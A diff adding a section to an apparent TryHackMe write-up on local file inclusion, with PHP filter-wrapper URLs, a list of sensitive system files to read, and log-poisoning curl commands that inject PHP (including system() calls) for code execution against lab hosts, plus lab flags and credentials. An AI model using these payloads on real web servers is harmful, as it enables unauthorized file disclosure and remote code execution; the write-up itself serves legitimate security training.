@@ -148,3 +148,114 @@ administrator:administrator<br>
 > Access the admin panel. What is the value of the flag?
 THM{ADM1N_AC3SS}<br>
 
+## Patch Management is Hard
+This focuses on local file inclusions. Since I know LFI pretty well I will only focus on the aspects I don't understand as well. To start, the concept of exploiting using LFI PHP filters<br>
+Typically, LFI's occur when something like the following is written:
+```php
+<?php 
+	include($_GET["file"])
+?>
+```
+In addition, other entry points can be used depending upon the web application, such as the User-Agent, Cookies, sessions and other HTTP headers.<br>
+Some files and directories of interest:
+* /etc/issue
+* /etc/passwd
+* /etc/shadow
+* /etc/group
+* /etc/hosts
+* /etc/motd
+* /etc/mysql/my.cnf
+* /proc/[0-9]*/fd/[0-9]*   (first number is the PID, second is the filedescriptor)
+* /proc/self/environ
+* /proc/version
+* /proc/cmdline
+
+Since PHP is a server side mechanism, the client never is able to see the PHP code. However, we can use the PHP filter wrapper to read the actual contents of the PHP file. In typical cases, it is not possible to read a PHP file's content via LFI because PHP files get executed and never show the existing code. However, we are able to display PHP in other forms such as Base64 and ROT13<br>
+```
+http://example.thm.labs/page.php?file=php://filter/read=string.rot13/resource=/etc/passwd 
+http://example.thm.labs/page.php?file=php://filter/convert.base64-encode/resource=/etc/passwd
+```
+
+Next, take a look at log poisoning. The attacker needs to include a malicious payload into services log files such as Apache, SSH, etc. Then, the LFI vulnerability is used to request the page that includes the malicious payload. I can send:<br>
+```bash
+curl -A "This is testing" http://10.10.62.229/login.php
+```
+And the following will appear in the http://10.10.62.229/logs.php
+```
+Guest:172.17.0.1:This is testing:/login.php
+```
+With this, we can inject PHP code into the logs and then fetch them to run whatever PHP code we want:
+```bash
+curl -A "<?php phpinfo(); ?>" http://10.10.62.229/login.php
+```
+And when displaying the log file using LFI we get the generic PHP information page.
+
+### Challenge
+> Deploy the attached VM and look around. What is the entry point for our web application? 
+err<br>
+
+> Use the entry point to perform LFI to read the /etc/flag file. What is the flag?
+Just a simple LFI.<br>
+http://10.10.62.229/index.php?err=/etc/flag
+THM{d29e08941cf7fe41df55f1a7da6c4c06}<br>
+
+> Use the PHP filter technique to read the source code of the index.php. What is the $flag variable's value?
+Use the previously stated PHP filter wrapper to display the page in Base64<br>
+http://10.10.62.229/index.php?err=php://filter/convert.base64-encode/resource=index.php
+Although, the only part we care about is the Base64 encoded part:<br>
+```
+PD9waHAgc2Vzc2lvbl9zdGFydCgpOwokZmxhZyA9ICJUSE17NzkxZDQzZDQ2MDE4YTBkODkzNjFkYmY2MGQ1ZDllYjh9IjsKaW5jbHVkZSgiLi9pbmNsdWRlcy9jcmVkcy5waHAiKTsKaWYoJF9TRVNTSU9OWyd1c2VybmFtZSddID09PSAkVVNFUil7ICAgICAgICAgICAgICAgICAgICAgICAgCgloZWFkZXIoICdMb2NhdGlvbjogbWFuYWdlLnBocCcgKTsKCWRpZSgpOwp9IGVsc2UgewoJJGxhYk51bSA9ICIiOwogIHJlcXVpcmUgIi4vaW5jbHVkZXMvaGVhZGVyLnBocCI7Cj8+CjxkaXYgY2xhc3M9InJvdyI+CiAgPGRpdiBjbGFzcz0iY29sLWxnLTEyIj4KICA8L2Rpdj4KICA8ZGl2IGNsYXNzPSJjb2wtbGctOCBjb2wtb2Zmc2V0LTEiPgogICAgICA8P3BocCBpZiAoaXNzZXQoJGVycm9yKSkgeyA/PgogICAgICAgICAgPHNwYW4gY2xhc3M9InRleHQgdGV4dC1kYW5nZXIiPjxiPjw/cGhwIGVjaG8gJGVycm9yOyA/PjwvYj48L3NwYW4+CiAgICAgIDw/cGhwIH0KCj8+CiA8cD5XZWxjb21lIDw/cGhwIGVjaG8gZ2V0VXNlck5hbWUoKTsgPz48L3A+Cgk8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1kYW5nZXIiIHJvbGU9ImFsZXJ0Ij5UaGlzIHNlcnZlciBoYXMgc2Vuc2l0aXZlIGluZm9ybWF0aW9uLiBOb3RlIEFsbCBhY3Rpb25zIHRvIHRoaXMgc2VydmVyIGFyZSBsb2dnZWQgaW4hPC9kaXY+IAoJPC9kaXY+Cjw/cGhwIGlmKCRlcnJJbmNsdWRlKXsgaW5jbHVkZSgkX0dFVFsnZXJyJ10pO30gPz4KPC9kaXY+Cgo8P3BocAp9Cj8+
+```
+Decoding and writing to a file gets the PHP source code<br>
+```php
+<?php session_start();
+$flag = "THM{791d43d46018a0d89361dbf60d5d9eb8}";
+include("./includes/creds.php");
+if($_SESSION['username'] === $USER){                        
+	header( 'Location: manage.php' );
+	die();
+} else {
+	$labNum = "";
+  require "./includes/header.php";
+?>
+<div class="row">
+  <div class="col-lg-12">
+  </div>
+  <div class="col-lg-8 col-offset-1">
+      <?php if (isset($error)) { ?>
+          <span class="text text-danger"><b><?php echo $error; ?></b></span>
+      <?php }
+
+?>
+ <p>Welcome <?php echo getUserName(); ?></p>
+	<div class="alert alert-danger" role="alert">This server has sensitive information. Note All actions to this server are logged in!</div> 
+	</div>
+<?php if($errInclude){ include($_GET['err']);} ?>
+</div>
+
+<?php
+}
+?>
+```
+THM{791d43d46018a0d89361dbf60d5d9eb8}<br>
+
+> Now that you read the index.php, there is a login credential PHP file's path. Use the PHP filter technique to read its content. What are the username and password?
+Another simple LFI using the PHP filter technique.<br>
+http://10.10.62.229/index.php?err=php://filter/convert.base64-encode/resource=includes/creds.php
+Which gets:<br>
+PD9waHAgCiRVU0VSID0gIk1jU2tpZHkiOwokUEFTUyA9ICJBMEMzMTVBdzNzMG0iOwo/<br>
+Decodes into
+```php
+<?php 
+$USER = "McSkidy";
+$PASS = "A0C315Aw3s0m";
+?
+```
+> The web application logs all users' requests, and only authorized users can read the log file. Use the LFI to gain RCE via the log file page. What is the hostname of the webserver? The log file location is at ./includes/logs/app_access.log.
+I just curled the log file with PHP:
+```bash
+curl -A "<?php system('uname -a'); ?>" http://10.10.62.229/login.php
+```
+And used LFI to load the log file and get the flag:
+http://10.10.62.229/index.php?err=php://filter/resource=./include/logs/app_access.log
+lfi-aoc-awesome-59aedca683fff9261263bb084880c965<br>
